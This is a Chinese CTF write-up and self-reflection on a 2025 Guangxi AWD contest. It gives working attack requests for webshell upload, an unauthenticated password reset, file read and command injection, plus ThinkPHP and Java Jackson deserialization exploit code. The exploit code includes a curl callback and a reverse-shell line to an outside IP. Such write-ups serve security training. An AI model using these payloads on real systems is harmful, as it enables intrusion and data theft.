# 2025年广西网络与信息安全职业技能竞赛决赛 awd web部分 赛后WriteUP以及自我检讨

> 原文: https://www.ctfiot.com/283303.html
> ID: 283303

❝

由于传播、利用本公众号”隼目安全”所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号”隼目安全”及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！

今天，广西省赛决赛，也是我第一次打awd线下赛。我搞砸了，彻彻底底。

直到最后比赛结束，大脑依旧一片空白，在断网环境下我就像被拔掉了个移动硬盘，手足无措，一道题也没做出来。

我的队伍只有我一个人，但是我不认为这是我失败的借口，一个人组队，意味着我要更清醒地意识到自己应该做怎样的准备，以及自己应该做什么。比赛一开始，我就因为过度紧张，犯了一个极其低级、愚蠢的错误：我完全没有仔细看裁判发的纸质密码文件信封还有第二张纸片(可能一开始也宣读过了，但是我因为紧张完全没听见)，我像个二哔一样死盯着平台上的密码。在问了几个裁判，他们让我“重新登录平台”却依旧失败后，我才从另一位裁判那里得知，信封里的第二张纸片上写着ssh的正确密码。

就这一个错误，让我白白浪费了开局的十几分钟，选手防御时间就二十分钟。节奏彻底乱了。

登录上去之后，因为断网环境而手足无措。大脑一片空白像被灌满了浆糊。面对PHP的那个框架、Java的那个CMS，代码量都很乱很多，我明明知道它们肯定有漏洞，可我一个都找不到。那些在网上搜索复现、在AI辅助下看起来一目了然的漏洞点，在断网的时候，无比陌生。我像个无头苍蝇，在代码里乱撞。

CPP的菜单题，裸UAF的pwn，调试得手忙脚乱。看似以为自己明白了大致思路，到最后也不知道自己该怎么做。

我没有尊重这场比赛，没有尊重我的对手，甚至没有尊重我自己。根本就没有做好准备。

归根结底，是我基础太弱了。我的基础薄弱得像一层窗户纸，一捅就破。我太依赖网络上的文章和AI了，它们给了我一种“我会了”的虚假繁荣。一旦断网，我被扒得精光，所有薄弱和不堪全部暴露。

这已经不是第一次了。今年八月份的某比赛，同样的断网环境，我已经尝过这种强烈的挫败。可我却没有真正反省，没有去踏踏实实地补基础。离开了AI，我甚至连独立、耐心地阅读代码、分析漏洞都做不到。比赛快结束时，我脑子里空空如也，巨大的挫败感涌上来，鼻子一酸，差点当场哭出来。那一刻，我真的觉得自己是个废物。

今天这场比赛，像一盆冰水，浇醒了我这个装睡的人，让我认清自己：我没有扎实的基础，没有独立分析审计复杂代码的能力。

我的问题在于我的态度，我总想走捷径，好高骛远，却忽略了脚踏实地，没有牢固的基础。

写下这些，不是为了卖惨。是写给自己看的，是为了记住今天这个狼狈、无力、失败的自己。我要把这份难受钉在这里，让它时时刻刻提醒我：

下一次，在断网的地方，我绝不能再输得这么难看了。

从现在开始锻炼自己适应摆脱搜索文章和依赖ai，多利用和收集整理本地的资料。

以下题目都是我赛后联网做的，赛后做完发现这些分真的很不应该丢，大多都是特别基础的题目

【php】

题目名叫什么我忘记了，就叫他php吧

漏洞点1

默认密码admin/likeadmin登录

不知道为什么我当时没有登录成功，还有其他很多选手也是这样反映，我是在前20分钟内测试的likeadmin这个密码，按理来说即使有个密码重置漏洞也不会那么快打的，但是有师傅回去看自己录屏，确实是用likeadmin可以登录

这道题很难绷其实，登录框限制输入密码错误五次就自动锁定30分钟，但是因为靶机上的mysql会被锁定，普通用户无法访问数据库所以只能爆破，也就是说整场比赛下来最多尝试30次密码

漏洞点2

后台任意文件上传，这也是一个非常明显的漏洞，我当时也发现了，但是因为没法登录后台，思路卡主了

我第一次打线下赛的awd，以为一道题只有一个漏洞入口，因此没有去审其他代码，错过了很多更基础的漏洞

serverappadminapicontrollerUploadController.php中有一个file()方法

可以上传任意文件

POST /adminapi/upload/file HTTP/1.1Host: 192.168.2.27:8091token: c44e3426e73f3f7c1a7562ce1cacb962Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWContent-Length: 198------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="file"; filename="123.php"Content-Type: image/png<?php phpinfo();?>------WebKitFormBoundary7MA4YWxkTrZu0gW--

漏洞点3

未授权

虽然说是前台漏洞，不过其实也是黑盒测出来的，在操作的时候删除管理员token发现依旧可以操作，代码很多很乱，awd时间短，这么紧张的时间一般很少人注意thinkphp的鉴权问题

用户操作未鉴权

可未授权重置管理员密码

POST /adminapi/auth.admin/edit HTTP/1.1Host: 127.0.0.1:2998Content-Length: 247sec-ch-ua:version: 1.9.4sec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Content-Type: application/json;charset=UTF-8Accept: application/json, text/plain, */*sec-ch-ua-platform:""Origin: http://127.0.0.1:2998Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1:2998/admin/permission/adminAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: http304ok=1; thinkphp_show_page_trace=0|0Connection: close{"id":1,"account":"admin","name":"admin","dept_id":[1],"jobs_id":[],"role_id":[],"avatar":"http://127.0.0.1:2998/resource/image/adminapi/default/avatar.png","password":"admin1","password_confirm":"admin1","disable":0,"multipoint_login":1,"root":1}

即使不用token依旧能操作管理员账号

漏洞点4

也是一个非常明显并且基础的任意读取，但是我全程没有上正则的审计工具，在发现文件上传之后就一直琢磨怎么登录

serverappadminapicontrollerFileController.php

read()方法的file参数在readfile里面

存在任意文件读取

POST /adminapi/file/readHTTP/1.1Host: 127.0.0.1:2998Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: thinkphp_show_page_trace=0|0Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 17file=E:\test.txt

漏洞点5

命令执行

踏马的当时明明d盾已经扫到了这个call_user_func_array，但是我觉得不可能这么明显就没点进去细看，在现场的时候最后也和这个rce擦肩而过了

漏洞点6

反序列化

这个漏洞相对来说就比较复杂了

这是一个基于ThinkPHP框架与Symfony VarDumper组件组合的POP链

在serverappapicontrollerLoginController.php中

get_account()方法会对用户输入的cookie进行反序列化

这里是一个入口

访问/api/login/get_account时，Cookie中的Payload被反序列化，ResourceRegister对象被实例化。

代码入下

class ResourceRegister{ /** * 资源路由 * @var Resource */ protected$resource; /** * 是否注册过 * @var bool class Rule */ protected$registered=false; /** * 架构函数 * @access public * @param Resource $resource 资源路由 */ publicfunction__construct(Resource$resource) { $this->resource =$resource; } /** * 注册资源路由 * @access protected * @returnvoid */ protectedfunctionregister() { $this->registered =true; $this->resource->parseGroupRule($this->resource->getRule()); } /** * 动态方法 * @access public * @param string$method方法名 * @param array $args 调用参数 * @returnmixed */ publicfunction__call($method,$args) { returncall_user_func_array([$this->resource,$method],$args); } publicfunction__destruct() { if(!$this->registered) { $this->register(); } }}

当ThinkPHP框架处理ResourceRegister对象时，会访问其$resource属性，触发以下调用序列

// thinkrouteResource 继承自 RuleGroup// RuleGroup 继承自 Ruleabstract class Rule { protected$rule="1.2"; protected$option= ["var"=> ["1"=> new Pivot()]];}

关键机制在于，框架在路由解析时会遍历$option数组，访问Pivot对象

分析Validate类发现Validate类允许自定义验证类型

Validate类部分代码

class Validate{ /** * 自定义验证类型 * @var array */ protected$type= []; /** * 验证类型别名 * @var array */ protected$alias= [ '>'=>'gt','>='=>'egt','<'=>'lt','<='=>'elt','='=>'eq','same'=>'eq', ]; /** * 当前验证规则 * @var array */ protected$rule= []; /** * 验证提示信息 * @var array */ protected$message= []; /** * 验证字段描述 * @var array */ protected$field= []; /** * 默认规则提示 * @var array */ protected$typeMsg= [ 'require' =>':attribute require', 'must' =>':attribute must', 'number' =>':attribute must be numeric', 'integer' =>':attribute must be integer', 'float' =>':attribute must be float', 'string' =>':attribute must be string', 'boolean' =>':attribute must be bool', 'email' =>':attribute not a valid email address', 'mobile' =>':attribute not a valid mobile', 'array' =>':attribute must be a array', 'accepted' =>':attribute must be yes,on or 1', 'date' =>':attribute not a valid datetime', 'file' =>':attribute not a valid file', 'image' =>':attribute not a valid image', 'alpha' =>':attribute must be alpha', 'alphaNum' =>':attribute must be alpha-numeric', 'alphaDash' =>':attribute must be alpha-numeric, dash, underscore', 'activeUrl' =>':attribute not a valid domain or ip', 'chs' =>':attribute must be chinese', 'chsAlpha' =>':attribute must be chinese or alpha', 'chsAlphaNum'=>':attribute must be chinese,alpha-numeric', 'chsDash' =>':attribute must be chinese,alpha-numeric,underscore, dash', 'url' =>':attribute not a valid url', 'ip' =>':attribute not a valid ip', 'dateFormat' =>':attribute must be dateFormat of :rule', 'in' =>':attribute must be in :rule', 'notIn' =>':attribute be notin :rule', 'between' =>':attribute must between :1 - :2', 'notBetween' =>':attribute not between :1 - :2', 'length' =>'size of :attribute must be :rule', 'max' =>'max size of :attribute must be :rule', 'min' =>'min size of :attribute must be :rule', 'after' =>':attribute cannot be less than :rule', 'before' =>':attribute cannot exceed :rule', 'expire' =>':attribute not within :rule', 'allowIp' =>'access IP is not allowed', 'denyIp' =>'access IP denied', 'confirm' =>':attribute out of accord with :2', 'different' =>':attribute cannot be same with :2', 'egt' =>':attribute must greater than or equal :rule', 'gt' =>':attribute must greater than :rule', 'elt' =>':attribute must less than or equal :rule', 'lt' =>':attribute must less than :rule', 'eq' =>':attribute must equal :rule', 'unique' =>':attribute has exists', 'regex' =>':attribute not conform to the rules', 'method' =>'invalid Request method', 'token' =>'invalid token', 'fileSize' =>'filesize not match', 'fileExt' =>'extensions to upload is not allowed', 'fileMime' =>'mimetype to upload is not allowed', 'startWith' =>':attribute must start with :rule', 'endWith' =>':attribute must end with :rule', 'contain' =>':attribute must contain :rule', ]; /** * 当前验证场景 * @var string */ protected$currentScene; /** * 内置正则验证规则 * @var array */ protected$defaultRegex= [ 'alpha' =>'/^[A-Za-z]+$/', 'alphaNum' =>'/^[A-Za-z0-9]+$/', 'alphaDash' =>'/^[A-Za-z0-9-_]+$/', 'chs' =>'/^[p{Han}]+$/u', 'chsAlpha' =>'/^[p{Han}a-zA-Z]+$/u', 'chsAlphaNum'=>'/^[p{Han}a-zA-Z0-9]+$/u', 'chsDash' =>'/^[p{Han}a-zA-Z0-9_-]+$/u', 'mobile' =>'/^1[3-9]d{9}$/', 'idCard' =>'/(^[1-9]d{5}(18|19|([23]d))d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}[0-9Xx]$)|(^[1-9]d{5}d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)d{3}$)/', 'zip' =>'/d{6}/', ]; /** * Filter_var 规则 * @var array */ protected$filter= [ 'email' => FILTER_VALIDATE_EMAIL, 'ip' => [FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6], 'integer'=> FILTER_VALIDATE_INT, 'url' => FILTER_VALIDATE_URL, 'macAddr'=> FILTER_VALIDATE_MAC, 'float' => FILTER_VALIDATE_FLOAT, ]; /** * 验证场景定义 * @var array */ protected$scene= [];因此可以劫持hidden映射给systemclass Validate { protected$type= ["hidden"=>"system"];}

命令执行利用Symfony组件，继承Stub确保在序列化中保留完整结构

namespace SymfonyComponentVarDumperCaster;class ConstStub extends Stub { public$value="cat /flag";}

pop链

<?php// +----------------------------------------------------------------------+// | ThinkPHP 8 反序列化POP链利用代码// | 利用入口: /api/login/get_account (Cookie: account=...)// +----------------------------------------------------------------------+// ===== 第一阶段：Symfony VarDumper组件（命令存储） =====namespace SymfonyComponentVarDumperCloner { class Stub { public$value='curl kd35jg.dnslog.cn'; public$type= 5; }}namespace SymfonyComponentVarDumperCaster { use SymfonyComponentVarDumperClonerStub; class ConstStub extends Stub {} // 继承Stub以传递命令}// ===== 第二阶段：ThinkPHP验证器（函数劫持） =====namespace think { use SymfonyComponentVarDumperCasterConstStub; class Validate { protected$type= []; // 关键：验证类型映射表 publicfunction__construct() { // 将"hidden"验证类型劫持到system函数 $this->type= ["hidden"=>"system"]; } } abstract class Model { protected$append= []; // 触发属性追加 protected$relation= []; // 绑定验证器 protected$hidden= []; // 存储命令对象 publicfunction__construct() { // 构造三角关系：append -> hidden -> relation $this->hidden = ["pwn"=> new ConstStub()]; //"pwn"是触发属性名 $this->append = ["pwn"=> []]; // 触发对"pwn"属性的访问 $this->relation = ["pwn"=> new Validate()]; // 访问时调用Validate验证器 } }}// ===== 第三阶段：ThinkPHP模型（触发载体） =====namespace thinkmodel { use thinkModel; class Pivot extends Model {} // 具体模型类，继承Model的触发逻辑}// ===== 第四阶段：ThinkPHP路由（入口包装） =====namespace thinkroute { use thinkmodelPivot; abstract class Rule { protected$rule="1.2"; protected$option= []; // 路由参数，存放Pivot对象 publicfunction__construct() { // 将Pivot对象埋入路由参数中 $this->option = ["var"=> ["1"=> new Pivot()]]; } } class RuleGroup extends Rule { publicfunction__construct() { parent::__construct(); } } class Resource extends RuleGroup {} // 具体路由规则类 class ResourceRegister { protected$resource; // 启动链的入口属性 publicfunction__construct() { $this->resource = new Resource(); // 包装Resource对象 } }}namespace { $entry= new thinkrouteResourceRegister(); $payload= base64_encode(serialize($entry)); echo"生成的Payload:n"; echo$payload."nn"; echo"利用方式:n"; echo"GET /api/login/get_account HTTP/1.1n"; echo"Host: target.comn"; echo"Cookie: account=".$payload."n";}

【java】

题目名字我也忘记了，好像叫什么cms吧，就叫他java了

当时拿到附件就被吓一跳，jar包接近80mb要去分析，开什么玩笑

来到pb-cms.jar!BOOT-INFclassescompubootmoduleadmincontrollerTemplateInitController.class的位置，发现这是/init/template接口的控制器，直接调用了TemplateFileServiceImpl.copyTemplate()方法，并接收用户传入的file, target, overwrite参数

继续跟进到TemplateFileServiceImpl

可以移动文件到指定目录并且选择是否覆盖

GET /init/template?file=C:/Users/attac/Downloads/192.168.20.128/202511190920/1.txt&target=C:/Users/attac/Downloads/192.168.20.128/202511190920/static/ HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close

命令执行

在BlogApiController中，会获取用户输入的path

并且直接根据当前系统将path拼接到命令中，可以使用逻辑运算符来截断

POST /blog/api/filelist HTTP/1.1Host: localhost:8080sec-ch-ua:sec-ch-ua-mobile: ?0sec-ch-ua-platform:""Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 12path=|whoami

jdbc连接mysql fake server读文件

看到连接mysql的功能，立马就能想到通过远程连接mysql fake server来读本地文件(当时线下断网，我的mysql fake server在公网服务器上)

参考文章

http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/https://www.vesiluoma.com/abusing-mysql-clients/

在testConnection中有一个连接数据库的功能

结合DatabaseVo.class构造jdbc连接mysql的payload

POST /database/testConnection HTTP/1.1Host: localhost:8080Content-Type: application/jsonContent-Length: 235{"dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://{服务器ip}:3306/fake_db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/","dbUsername":"caonima","dbPassword":"hack"}

反序列化

在pb-cms.jar!BOOT-INFclassescompubootmoduleadmincontrollerCommentController.class中

存在一个backdoor路由

接收并且反序列化data参数传入的数据

@PostMapping({"/backdoor"})public void backdoor(String data) throws Exception { this.commentService.deserialize(data);}private void completeComment(BizComment comment) {HttpServletRequest request = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest();User user = (User)SecurityUtils.getSubject().getPrincipal();comment.setUserId(user.getUserId());comment.setNickname(user.getNickname());comment.setEmail(user.getEmail());comment.setAvatar(user.getImg());comment.setIp(IpUtil.getIpAddr(request));comment.setStatus(CoreConst.STATUS_VALID);}public CommentController(final BizCommentService commentService) { this.commentService = commentService;}}

发现直接将data传递给commentService.deserialize(data)，继续跟进commentService

//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.puboot.module.admin.service.impl;import com.baomidou.mybatisplus.core.metadata.IPage;import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;import com.puboot.common.util.Pagination;import com.puboot.module.admin.mapper.BizCommentMapper;import com.puboot.module.admin.model.BizComment;import com.puboot.module.admin.service.BizCommentService;import com.puboot.module.admin.vo.CommentConditionVo;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import java.util.Base64;import java.util.HashMap;import org.springframework.stereotype.Service;@Servicepublic class BizCommentServiceImpl extends ServiceImpl<BizCommentMapper, BizComment> implements BizCommentService { private final BizCommentMapper commentMapper; public IPage<BizComment> selectComments(CommentConditionVo vo, Integer pageNumber, Integer pageSize) { IPage<BizComment> page = new Pagination((long)pageNumber, (long)pageSize); page.setRecords(this.commentMapper.selectComments(page, vo)); returnpage; } public int deleteBatch(Integer[] ids) { returnthis.commentMapper.deleteBatch(ids); } public Object deserialize(String data) throws IOException { if(data == null) { throw new IOException("data is null"); }else{ byte[] decode; try { decode = Base64.getDecoder().decode(data); } catch (IllegalArgumentException var36) { IllegalArgumentException e = var36; throw new IOException("Base64 decode failed", e); } ByteArrayInputStream bais = new ByteArrayInputStream(decode); Throwable var4 = null; Object e; try { ObjectInputStream ois = new ObjectInputStream(bais) { boolean check =false; protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { Class<?> targetc = super.resolveClass(desc); if(!this.check && !HashMap.class.isAssignableFrom(targetc)) { throw new IllegalArgumentException("HackerClass:"+ targetc); }else{ this.check =true; returntargetc; } } }; Throwable var6 = null; try { try { e = ois.readObject(); } catch (ClassNotFoundException var34) { e = var34; throw new RuntimeException((Throwable)e); } } catch (Throwable var35) { e = var35; var6 = var35; throw var35; } finally { if(ois != null) { if(var6 != null) { try { ois.close(); } catch (Throwable var33) { var6.addSuppressed(var33); } }else{ ois.close(); } } } } catch (Throwable var38) { var4 = var38; throw var38; } finally { if(bais != null) { if(var4 != null) { try { bais.close(); } catch (Throwable var32) { var4.addSuppressed(var32); } }else{ bais.close(); } } } returne; } } public BizCommentServiceImpl(final BizCommentMapper commentMapper) { this.commentMapper = commentMapper; }}

其中deserialize方法的ObjectInputStream是一个沙箱，只允许 HashMap 及其子类作为第一个反序列化的类

第一次调用 resolveClass 时 check=false，会检查是否为 HashMap

第二次及以后调用时 check=true，绕过检查，可以加载任意类

HashMap开头的链子容易想到cc1 cc6等等

但是Created-By: Maven JAR Plugin 3.2.2，所以cc链打不了

看一眼依赖有jackson等等

主要是链子的拼接

漏洞参考

https://github.com/FasterXML/jackson-databind/issues/2986https://zhuanlan.zhihu.com/p/1923706452289225199

通过这些依赖不难找到Gadget链

我参考的链子是

/*HashMap.readObejct() HashMap.hashcode() ObjectIdGenerator.IdKey.equals() XString.equals() POJONode.toString()*/

最后的大致思路是先创建TemplatesImpl然后加载恶意类，包装成POJONode，利用hashmap打hashcode。用ObjectIdGenerator.IdKey构造哈希碰撞，在HashMap反序列化时触发POJONode的equals比较在HashMap反序列化的时候就会触发POJONode的equals比较，equals比较时触发TemplatesImpl的getOutputProperties

完整利用链

HashMap::readObject() ↓HashMap::putVal() ↓ HashMap::hash() ↓ObjectIdGenerator$IdKey::hashCode() ↓POJONode::hashCode() ↓ POJONode::toString() ↓POJONode::serialize() ↓BeanSerializer::serialize() ↓BeanSerializer::serializeFields() ↓BeanPropertyWriter::serializeAsField() ↓MethodProperty::get() ↓TemplatesImpl::getOutputProperties() ↓TemplatesImpl::newTransformer() ↓TemplatesImpl::getTransletInstance() ↓TransletClassLoader::defineClass() ↓恶意类::<clinit>() ↓Runtime::exec()

payload

import com.fasterxml.jackson.annotation.ObjectIdGenerator;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URLEncoder;import java.util.Base64;import java.util.HashMap;public class exp { public static void main(String[] args) throws Exception { CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace"); ctClass.removeMethod(writeReplace); ctClass.toClass(); TemplatesImpl tmp = new TemplatesImpl(); setValue(tmp,"_tfactory", new TransformerFactoryImpl()); setValue(tmp,"_name","Phantom"); setValue(tmp,"_bytecodes", generateEvilBytes()); POJONode pojoNode = new POJONode(tmp); ObjectIdGenerator.IdKey idkey1 = new ObjectIdGenerator.IdKey(Object.class, Object.class, new XString("")); ObjectIdGenerator.IdKey idkey2 = new ObjectIdGenerator.IdKey(Object.class, Object.class, pojoNode); setFieldValue(idkey1,"hashCode", 0); setFieldValue(idkey2,"hashCode", 2); HashMap<Object, Object> hashMap = new HashMap<Object, Object>(); hashMap.put(idkey1,"x"); hashMap.put(idkey2,"a"); setFieldValue(idkey2,"hashCode", 0); byte[] serializedData = serialize(hashMap); String base64Payload = Base64.getEncoder().encodeToString(serializedData); String urlEncodedPayload = URLEncoder.encode(base64Payload,"UTF-8"); System.out.println("Base64 Payload:"); System.out.println(base64Payload); System.out.println("nURL Encoded Payload:"); System.out.println(urlEncodedPayload); // unserialize(serializedData); } public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objo = new ObjectOutputStream(baos); objo.writeObject(obj); objo.close(); returnbaos.toByteArray(); } public static void unserialize(byte[] string) throws Exception { ByteArrayInputStream bais = new ByteArrayInputStream(string); ObjectInputStream obji = new ObjectInputStream(bais); obji.readObject(); obji.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[][] generateEvilBytes() throws Exception { ClassPool cp = ClassPool.getDefault(); cp.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = cp.makeClass("evil"); String cmd ="java.lang.Runtime.getRuntime().exec("calc");"; // String cmd ="java.lang.Runtime.getRuntime().exec("sh -i >& /dev/tcp/154.201.70.35/8080 0>&1");"; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(cp.get(AbstractTranslet.class.getName())); returnnew byte[][]{cc.toBytecode()}; } public static <T> void setValue(Object obj, String fname, T f) throws Exception { Field filed = TemplatesImpl.class.getDeclaredField(fname); filed.setAccessible(true); filed.set(obj, f); }}// Base64 Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB+AAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB+AAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB+AAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABmMr+ur4AAAA0ABsBAARldmlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAEY2FsYwgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFgEABjxpbml0PgwAGAAICgAXABkAIQACABcAAAAAAAIACAAHAAgAAQAJAAAAFgACAAAAAAAKuAAPEhG2ABVXsQAAAAAAAQAYAAgAAQAJAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAdQaGFudG9tcHcBAHhxAH4ADXEAfgANdAABYXg=// URL Encoded Payload:// rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACc3IAOGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5hbm5vdGF0aW9uLk9iamVjdElkR2VuZXJhdG9yJElkS2V5AAAAAAAAAAECAARJAAhoYXNoQ29kZUwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wABXNjb3BldAARTGphdmEvbGFuZy9DbGFzcztMAAR0eXBlcQB%2BAAR4cAAAAABzcgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZxwKJztIFsX9AgAAeHIAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhPYmplY3T0mBIJu3u2GQIAAUwABW1fb2JqcQB%2BAAN4cgAsY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLkV4cHJlc3Npb24H2aYcjays1gIAAUwACG1fcGFyZW50dAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94cGF0aC9pbnRlcm5hbC9FeHByZXNzaW9uTm9kZTt4cHB0AAB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHBxAH4ADXQAAXhzcQB%2BAAIAAAAAc3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AA3hyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cm